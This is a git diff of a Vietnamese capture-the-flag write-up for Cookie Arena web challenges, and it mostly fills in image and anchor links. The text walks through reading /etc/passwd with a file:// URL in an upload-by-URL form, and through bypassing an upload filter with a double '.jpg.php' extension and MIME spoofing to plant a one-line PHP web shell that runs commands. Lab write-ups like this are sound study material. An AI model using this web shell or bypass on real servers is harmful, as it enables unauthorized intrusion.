@@ -42,8 +42,8 @@
 - [Logger Middleware](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#logger-middleware)
 - [Baby File Inclusion](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#baby-file-inclusion)
 - [Remote File Inclusion](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#remote-file-inclusion)
-- [Upload File via URL]()
-- [The Evil Assignment on Canvas]()
+- [Upload File via URL](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#upload-file-via-url)
+- [The Evil Assignment on Canvas](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#the-evil-assignment-on-canvas)
 ### HTTP Request Content-Length
 Challenge:
 
@@ -1190,77 +1190,77 @@ Tôi thử thay giá trị tham số `file` thành `file:///etc/passwd`:
 
 ### Upload File via URL
 
-![img](214)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image214.png?raw=true)
 
 Trang web:
 
-![img](215)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image215.png?raw=true)
 
 Thử nhập `file:///etc/passwd` và submit:
 
-![img](216)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image216.png?raw=true)
 
 Kiểm tra source code:
 
-![img](217)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image217.png?raw=true)
 
 Thử click vào `static/upload/passwd`, kiểm tra request và response trong Burp Suite:
 
-![img](218)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image218.png?raw=true)
 
 => Thành công trả về nội dung file `/etc/passwd`. Tiếp theo, chỉ cần nhập `file:///flag.txt` là tìm ra flag:
 
-![img](219)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image219.png?raw=true)
 
 ### The Evil Assignment on Canvas
 
-![img](220)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image220.png?raw=true)
 
 Trang web:
 
-![img](221)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image221.png?raw=true)
 
 Là một trang upload file. Tôi thử upload 1 file ảnh `.jpg`:
 
-![img](222)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image222.png?raw=true)
 
 => Upload thành công file `.jpg`, kiểm tra request, tôi thử đổi extension thành `.php`:
 
-![img](223)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image223.png?raw=true)
 
 => Không thành công. Tôi thử sửa thành `.jpg.php`:
 
-![img](224)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image224.png?raw=true)
 
 => Server chấp nhận file có extension là `.jpg.php`. Tiếp theo, tôi tạo file `shell.php` có nội dung là:
 
-   <?php echo system($_GET['cmd']); ?>
+    <?php echo system($_GET['cmd']); ?>
 
 Thay đổi MIME Type của file thành `.jpg` để server nhận diện file là file `.jpg`:
 
-![img](225)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image225.png?raw=true)
 
-![img](226)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image226.png?raw=true)
 
 Thử đổi tên file thành `shell.jpg` và upload:
 
-![img](227)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image227.png?raw=true)
 
 => Upload thành công, thực hiện thêm `.php` vào tên file và upload lại:
 
-![img](228)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image228.png?raw=true)
 
 => Upload thành công, truy cập `/uploads/shell.jpg.php?cmd=id` để kiểm tra:
 
-![img](229)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image229.png?raw=true)
 
 Tiếp theo, thay lệnh `id` thành `find / -name *.txt` để tìm file chứa flag:
 
-![img](230)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image230.png?raw=true)
 
 => Tìm ra file chứa flag là `/flagtSPRh.txt`, tiếp theo xem nội dung file và tìm được flag:
 
-![img](231)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image231.png?raw=true)
 
 
 
